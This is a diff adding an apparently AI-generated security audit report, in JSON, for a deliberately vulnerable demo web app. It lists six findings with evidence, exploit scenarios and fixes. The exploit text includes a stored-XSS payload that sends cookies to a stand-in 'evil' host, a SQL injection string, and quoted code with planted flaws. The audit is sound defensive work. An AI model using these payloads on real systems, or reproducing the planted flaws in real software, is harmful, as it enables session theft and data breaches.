@@ -1,0 +1,90 @@
+{
+  "grade": "F",
+  "summary": "Six confirmed issues in ./demo-app: committed secrets, a client-exposed admin token, unauthenticated admin APIs, IDOR on notes, SQL injection in search, and stored XSS in note rendering. Immediate remediation required before any production deploy.",
+  "findingCount": {
+    "critical": 2,
+    "high": 3,
+    "medium": 1,
+    "low": 0
+  },
+  "topExploitChain": "Read sk-fake keys from committed demo-app/.env → extract window.__ADMIN_TOKEN from the client bundle → call GET /api/admin unauthenticated → enumerate other users' notes via ?userId= → exfiltrate data using SQLi on /api/search → persist XSS payload in a note rendered by Note.tsx for session hijack.",
+  "demoScript": [
+    "Open the audit UI and review grade F with six findings across secrets, auth, and injection.",
+    "Walk the top exploit chain: secrets → admin token → open admin API → IDOR → SQLi → stored XSS.",
+    "Generate fix PLAN, copy for Cursor, and paste into the demo-app workspace to remediate in one session."
+  ],
+  "agentContributions": {
+    "secrets-scout": 2,
+    "auth-guard": 2,
+    "injection-hunter": 2,
+    "orchestrator": 6
+  },
+  "findings": [
+    {
+      "id": "VG-001",
+      "title": "Committed .env with live-format API keys and database credentials",
+      "severity": "critical",
+      "category": "secrets-exposure",
+      "file": "demo-app/.env",
+      "line": 1,
+      "evidence": "CURSOR_API_KEY=sk-fake-demo-key-do-not-use\nOPENAI_API_KEY=sk-fake-openai-key-12345\nGITHUB_TOKEN=ghp_fake_github_token_for_demo",
+      "exploitScenario": "Clone the repo or browse history; attacker harvests keys and connection strings for lateral movement into CI, cloud, and database hosts.",
+      "fixHint": "Remove .env from git, rotate all exposed values, add .env to .gitignore, and load secrets from a vault or deployment env only."
+    },
+    {
+      "id": "VG-002",
+      "title": "Admin token embedded in client bundle via inline script",
+      "severity": "critical",
+      "category": "client-secret-leak",
+      "file": "demo-app/app/page.tsx",
+      "line": 9,
+      "evidence": "const ADMIN_TOKEN = \"sk-admin-super-secret-token-abc123\";\n<script dangerouslySetInnerHTML={{ __html: `window.__ADMIN_TOKEN=\"${ADMIN_TOKEN}\"` }} />",
+      "exploitScenario": "View page source or DevTools; read window.__ADMIN_TOKEN and replay it on privileged routes or admin tooling.",
+      "fixHint": "Never ship admin tokens to the browser; use httpOnly session cookies and server-only env vars for privileged operations."
+    },
+    {
+      "id": "VG-003",
+      "title": "Admin API exposes user list without authentication",
+      "severity": "high",
+      "category": "broken-access-control",
+      "file": "demo-app/app/api/admin/route.ts",
+      "line": 3,
+      "evidence": "// VULN: no authentication on admin endpoint\nreturn NextResponse.json({ users: [\"alice\", \"bob\"], role: \"admin\" });",
+      "exploitScenario": "curl GET /api/admin — unauthenticated caller receives admin JSON and can invoke DELETE to wipe data.",
+      "fixHint": "Require session or JWT with admin role on every handler; reject anonymous requests with 401/403."
+    },
+    {
+      "id": "VG-004",
+      "title": "IDOR: notes endpoint returns any user's data by userId param",
+      "severity": "high",
+      "category": "idor",
+      "file": "demo-app/app/api/notes/route.ts",
+      "line": 7,
+      "evidence": "const userId = searchParams.get(\"userId\");\n// VULN: IDOR - returns any user's notes without auth\nreturn NextResponse.json({ userId, notes: notes[userId as keyof typeof notes] ?? [] });",
+      "exploitScenario": "Iterate ?userId=1,2,… to read other users' notes without logging in as them.",
+      "fixHint": "Bind notes to the authenticated principal from the session; ignore client-supplied userId for authorization."
+    },
+    {
+      "id": "VG-005",
+      "title": "SQL injection via unsanitized search query concatenation",
+      "severity": "high",
+      "category": "sql-injection",
+      "file": "demo-app/app/api/search/route.ts",
+      "line": 7,
+      "evidence": "const q = searchParams.get(\"q\") ?? \"\";\nconst query = `SELECT * FROM items WHERE title LIKE '%${q}%'`;",
+      "exploitScenario": "Request /api/search?q=' OR '1'='1 — crafted input breaks out of the LIKE clause for full table read or destructive statements if executed.",
+      "fixHint": "Use parameterized queries / an ORM; never interpolate user input into SQL strings."
+    },
+    {
+      "id": "VG-006",
+      "title": "Stored XSS via dangerouslySetInnerHTML on note content",
+      "severity": "medium",
+      "category": "xss",
+      "file": "demo-app/components/Note.tsx",
+      "line": 3,
+      "evidence": "// VULN: renders unsanitized HTML\nreturn <div dangerouslySetInnerHTML={{ __html: content }} />;",
+      "exploitScenario": "Save a note containing <img src=x onerror=fetch('https://evil/?c='+document.cookie)>; victims viewing the note execute attacker script.",
+      "fixHint": "Sanitize HTML with a vetted library, or render plain text only; avoid dangerouslySetInnerHTML for user content."
+    }
+  ]
+}
